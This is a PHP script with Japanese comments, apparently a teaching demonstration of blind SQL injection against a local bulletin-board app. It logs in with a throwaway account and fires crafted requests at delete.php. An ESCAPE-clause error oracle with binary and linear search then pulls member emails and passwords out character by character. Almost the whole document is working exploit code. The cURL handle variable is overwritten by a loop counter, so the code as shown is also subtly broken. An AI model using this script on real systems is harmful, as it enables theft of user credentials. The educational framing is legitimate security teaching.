<?php
//スクリプトの中味ですが、攻撃対象は認証が必要ですので、Cookieを有効にして、IDとパスワード（攻撃用の捨てアカウント）をPOSTします

define('BASEURL', 'http://127.0.0.1');//IPアドレス
define('DOCID', 18);    // 攻撃者が投稿した文書のID
// 略
// cURL初期化
$ch = curl_init();
curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ch, CURLOPT_COOKIEFILE, 'cookie.txt');
curl_setopt($ch, CURLOPT_COOKIEJAR, 'cookie.txt');

// 以下、ログイン
curl_setopt($ch, CURLOPT_URL, BASEURL . '/minibbs/login.php');
curl_setopt($ch, CURLOPT_POST, 1);
curl_setopt($ch, CURLOPT_POSTFIELDS, 'email=sato@example.jp&password=password&save=on');
curl_exec($ch);
//この状態で、sato@example.jpでログインしてリクエストができるようになります。
//攻撃で得る情報は、members表のemailとpassword列にしましょう。これらの文字種は、英数字、ドット、ハイフン、アンダースコアとして、これらの文字の集合を求めましょう。バイナリサーチの都合で文字コード順に並べておきます。


// $chars .. 探索候補文字のコードの配列
$chars = array();
for ($ch = 32; $ch < 128; $ch++) {
  if (preg_match('/[\.\-\_\@0-9A-Z]/', chr($ch))) {
    $chars[] = $ch;
  }
}

//以下のループは以下のようになります。行、列、n文字目の三重ループがあり、そのなかで、おおまかな範囲を二分探索で絞り、そこからリニアサーチで該当文字を求めています。

// 表の1行目から3行目を求めるループ
for ($num = 0; $num < 3; $num++) {
  // 列emailと列passwordを求めるループ
  foreach (array('email', 'password') as $colname) {
    $result = '';
    // 1文字目から順に求めるループ
    for ($p = 1;; $p++) {
      // 解が得られているかどうかのチェック
      $result_array = char_array($result);
      if (check1($ch, "(SELECT $colname FROM members LIMIT $num,1)=$result_array")) {
        echo "match : $result\n";  // 解が得られているので表示してループ脱出
        break;
      }
      // 以下、$p文字目を求める二分探索。ここでは大ざっぱな範囲の絞り込みのみ
      $min = 0;
      $max = count($chars) - 1;
      while ($max - $min > 2) {
        $pivot = $min + ceil(($max - $min) / 2);  // ピボットの位置を計算
        $chrcode = $chars[$pivot];   // ピボットの位置の文字コード
        if (check1($ch, "substr((SELECT $colname FROM members LIMIT $num,1),$p,1)>=char($chrcode)")) {
          $min = $pivot;
        } else {
          $max = $pivot - 1;
        }
      }

      // 以下、$p文字目を求める線形探索
      $found = 0;
      for ($pivot = $min; $pivot <= $max; $pivot++) {
        $chrcode = $chars[$pivot];
        if (check1($ch, "substr((SELECT $colname FROM members LIMIT $num,1),$p,1)=char($chrcode)")) {
          $found = 1;
          break;
        }
      }
      if (! $found) {
        echo "not found\n";
        break;
      }
      $result .= chr($chars[$pivot]);
    }
  }
}

//check1関数は、ブラインドSQLインジェクションの一リクエストを組み立てて送信するものです。

function check1($ch, $condition) {
  // ESCAPE句によるブラインドの定型的なSQL文
  $subquery = "(SELECT id FROM members WHERE id LIKE char(88) ESCAPE if($condition,char(49),char(49,50)))";
  $url = BASEURL . '/minibbs/delete.php?id=' . DOCID . '-' . urlencode($subquery);
  curl_setopt($ch, CURLOPT_URL, $url);
  curl_setopt($ch, CURLOPT_POST, 0);
  $response = curl_exec($ch);   // HTTPリクエスト発射
  return ! preg_match('/Incorrect/', $response);  // エラーメッセージがレスポンスになければTRUE
}

//char_array()関数は、文字列をMySQLのchar()関数の呼び出しに変換して、シングルクォートを回避するための関数です。

function char_array($s) {
  if ($s === '')
    return 'char(0)';
  return 'char(' . implode(',', unpack('C*', $s)) . ')';
}

